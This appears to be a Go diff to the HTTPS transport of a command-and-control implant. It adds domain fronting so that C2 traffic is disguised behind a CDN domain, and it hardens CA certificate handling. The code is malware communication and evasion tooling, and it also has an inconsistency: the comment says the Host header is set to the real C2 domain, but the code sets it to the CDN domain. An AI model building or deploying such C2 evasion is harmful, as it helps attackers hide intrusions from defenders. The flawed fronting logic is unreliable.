@@ -14,11 +14,12 @@ import (
 )
 
 type HTTPSTransport struct {
-	baseURL string
-	client  *http.Client
+	baseURL   string
+	cdnDomain string // CDN domain for domain fronting (Host header override)
+	client    *http.Client
 }
 
-func NewHTTPSTransport(baseURL string, caCertPEM string) *HTTPSTransport {
+func NewHTTPSTransport(baseURL string, caCertPEM string, cdnDomain string) (*HTTPSTransport, error) {
 	tlsConfig := &tls.Config{}
 
 	if caCertPEM != "" {
@@ -28,23 +29,30 @@ func NewHTTPSTransport(baseURL string, caCertPEM string) *HTTPSTransport {
 			tlsConfig.RootCAs = certPool
 			tlsConfig.InsecureSkipVerify = false
 		} else {
-			// Fallback if PEM parsing fails
-			tlsConfig.InsecureSkipVerify = true
+			// C6: Fail hard if CA cert is provided but cannot be parsed.
+			// Never silently degrade to InsecureSkipVerify.
+			return nil, fmt.Errorf("failed to parse CA certificate PEM")
 		}
 	} else {
 		// Dev mode: no CA cert embedded
 		tlsConfig.InsecureSkipVerify = true
 	}
 
+	// For domain fronting: TLS SNI must match the CDN domain
+	if cdnDomain != "" {
+		tlsConfig.ServerName = cdnDomain
+	}
+
 	return &HTTPSTransport{
-		baseURL: baseURL,
+		baseURL:   baseURL,
+		cdnDomain: cdnDomain,
 		client: &http.Client{
 			Timeout: 30 * time.Second,
 			Transport: &http.Transport{
 				TLSClientConfig: tlsConfig,
 			},
 		},
-	}
+	}, nil
 }
 
 func (t *HTTPSTransport) Register(reg *pb.Register) (*pb.RegisterResponse, error) {
@@ -90,6 +98,12 @@ func (t *HTTPSTransport) post(path string, body []byte) ([]byte, error) {
 		return nil, err
 	}
 	req.Header.Set("Content-Type", "application/octet-stream")
+
+	// Domain fronting: override Host header to match the real C2 domain
+	// while TLS SNI points to the CDN domain
+	if t.cdnDomain != "" {
+		req.Host = t.cdnDomain
+	}
 
 	resp, err := t.client.Do(req)
 	if err != nil {
